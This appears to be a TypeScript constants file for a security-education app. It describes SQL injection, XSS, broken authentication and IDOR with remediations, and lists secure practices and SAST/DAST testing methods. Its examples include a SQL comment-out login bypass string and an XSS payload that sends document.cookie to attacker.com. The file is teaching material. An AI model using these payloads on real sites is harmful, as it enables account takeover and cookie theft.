import { Vulnerability, SecurePractice, TestingMethod } from './types';

export const VULNERABILITIES: Vulnerability[] = [
  {
    id: 'sqli',
    title: 'SQL Injection (SQLi)',
    description: 'SQL Injection occurs when an attacker can interfere with the queries that an application makes to its database.',
    impact: 'Critical',
    remediation: 'Use prepared statements (parameterized queries) and Object-Relational Mapping (ORM) tools.',
    example: "SELECT * FROM users WHERE username = 'admin' --' AND password = '...'"
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    description: 'XSS vulnerabilities occur when an application includes untrusted data in a web page without proper validation or escaping.',
    impact: 'High',
    remediation: 'Implement strict output encoding and use Content Security Policy (CSP).',
    example: "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"
  },
  {
    id: 'broken-auth',
    title: 'Broken Authentication',
    description: 'Vulnerabilities in authentication and session management that allow attackers to compromise passwords, keys, or session tokens.',
    impact: 'Critical',
    remediation: 'Implement multi-factor authentication (MFA) and secure session management.',
    example: "Predictable session IDs or lack of rate limiting on login forms."
  },
  {
    id: 'idor',
    title: 'Insecure Direct Object References (IDOR)',
    description: 'Occurs when an application provides direct access to objects based on user-supplied input.',
    impact: 'High',
    remediation: 'Implement proper access control checks for every object access.',
    example: "Changing /api/user/123 to /api/user/124 to see someone else's data."
  }
];

export const SECURE_PRACTICES: SecurePractice[] = [
  {
    id: 'input-val',
    title: 'Input Validation',
    description: 'The process of ensuring that a program operates on clean, correct, and useful data.',
    tips: [
      'Use allow-lists instead of block-lists.',
      'Validate for type, length, format, and range.',
      'Perform validation on the server-side.'
    ]
  },
  {
    id: 'least-privilege',
    title: 'Principle of Least Privilege',
    description: 'Giving a user or process only the minimum levels of access necessary to perform its functions.',
    tips: [
      'Run database processes with restricted users.',
      'Use scoped API keys.',
      'Regularly audit permissions.'
    ]
  }
];

export const TESTING_METHODS: TestingMethod[] = [
  {
    id: 'sast',
    title: 'SAST (Static Application Security Testing)',
    description: 'Analyzes source code or binaries without executing the application.',
    pros: ['Finds issues early in SDLC', 'High code coverage'],
    cons: ['High false positive rate', 'Cannot find runtime issues']
  },
  {
    id: 'dast',
    title: 'DAST (Dynamic Application Security Testing)',
    description: 'Tests the application from the outside while it is running.',
    pros: ['Finds runtime issues', 'Language independent'],
    cons: ['Found late in SDLC', 'Limited code coverage']
  }
];
